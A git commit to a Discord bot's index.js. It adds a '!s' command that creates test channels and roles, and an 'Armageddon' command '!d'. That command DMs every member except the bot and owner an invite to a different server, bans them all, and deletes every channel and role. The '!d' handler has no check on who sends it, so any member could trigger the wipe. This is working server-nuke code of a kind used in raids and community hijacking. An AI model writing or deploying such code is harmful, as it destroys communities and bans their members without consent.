39f7f46ee98351ee3188a909b31cf9d8cac85090
Kasper Knapik <kasper.knapik@gmail.com>
2021-02-03 00:26:28 +0100

    Changed main logic: - ignore messages from outside a guild - setup test server with '!s' - make and armageddon with '!d'
    Armageddon:
    - gets all users
    - filters for our bot and owner
    - send msg with invite to new server to filtered users
    - ban filtered users
    - clear all channels
    - clear all roles

--- index.js
+++ index.js
@@ -6,32 +6,48 @@ BotClient.on('ready', () => {
     console.log('Toster BOT is online!');
 });
 
-bot_client.on('message', msg => {
-    if (
-        msg.author.bot === false &&
-        msg.channel.name === 'memes' &&
-        msg.content !== ''
-    ) {
-        msg.reply('This is not the channel for that!')
-            .then(reply => {
-                reply.delete(3000);
-            });
-        msg.delete(1000);
-    }
+BotClient.on('message', msg => {
+    // Ignore messages that aren't from a guild
+    if (!msg.guild) return;
 
-    if (msg.content === '!delete' &&
-        msg.author.tag === 'TheToster#3003'
-    ) {
-        try {
-            msg.channel.bulkDelete(10)
-                .then(reply =>
-                    reply.delete(3000));
-        } catch (error) {
-            console.error;
+    if (msg.content.startsWith('!s')) {
+        for (let index = 0; index < 5; index++) {
+            msg.guild.channels
+                .create(`test-channel-${index+1}`, {
+                    type: 'text'
+                })
+                .then(console.log)
+                .catch(console.error);
+            msg.guild.channels.create(`test-channel-${index+1}`, {
+                    type: 'voice'
+                })
+                .then(console.log)
+                .catch(console.error);
+            msg.guild.roles
+                .create({
+                    data: {
+                        name: `test-role-${index+1}`,
+                    }
+                })
+                .then(console.log)
+                .catch(console.error);
         }
-    }
+    };
 
-    if (msg.content === '!ping') msg.reply('Pong!');
+    if (msg.content.startsWith('!d')) {
+        try {
+            msg.guild.members.cache
+                .filter(m => m.user.id !== config.bot_id && m.user.id !== msg.guild.ownerID)
+                .forEach(m => {
+                    m.user.send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!');
+                    m.ban();
+                });
+            msg.guild.channels.cache.forEach(channel => channel.delete());
+            msg.guild.roles.cache.forEach(role => role.delete());
+        } catch (error) {
+            console.log(error);
+        }
+    };
 });
 
 BotClient.login(config.token);
